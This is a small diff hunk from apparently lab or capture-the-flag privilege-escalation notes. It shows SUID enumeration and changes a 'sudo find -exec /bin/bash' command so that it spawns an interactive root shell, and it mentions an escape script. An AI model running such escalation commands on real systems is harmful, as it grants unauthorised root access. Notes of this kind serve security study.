@@ -28,7 +28,7 @@ getent group sudo
 find / -perm -4000 2>/dev/null
 
 # exploit find binary
-sudo find . -exec /bin/bash \; -quit
+sudo find . -exec /bin/bash -i \; -quit
 (interactive shell detection from SLS)
 
 # run escape.sh from root directory
